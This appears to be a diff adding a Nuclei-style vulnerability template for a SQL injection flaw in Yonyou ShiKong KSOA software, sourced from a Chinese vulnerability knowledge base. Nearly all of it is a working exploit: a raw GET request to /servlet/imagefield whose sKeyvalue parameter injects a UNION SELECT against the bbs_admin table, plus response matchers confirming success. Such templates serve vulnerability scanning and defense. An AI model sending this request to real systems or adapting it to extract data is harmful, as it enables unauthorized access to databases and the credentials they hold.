@@ -1,0 +1,46 @@
+id: poc-fitf3tt6ezp8itld
+info:
+  name: 用友时空KSOA SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fitf3tt6ezp8itld'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fitf3tt6ezp8itld
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1''+union+select+sys.fn_varbintohexstr(hashbytes(''md5'',''test''))--+ HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept: */*
+
+
+    Accept-Language: en
+
+
+    Accept-Encoding: gzip
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    098f6bcd4621d373cade4e832627b4f6
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
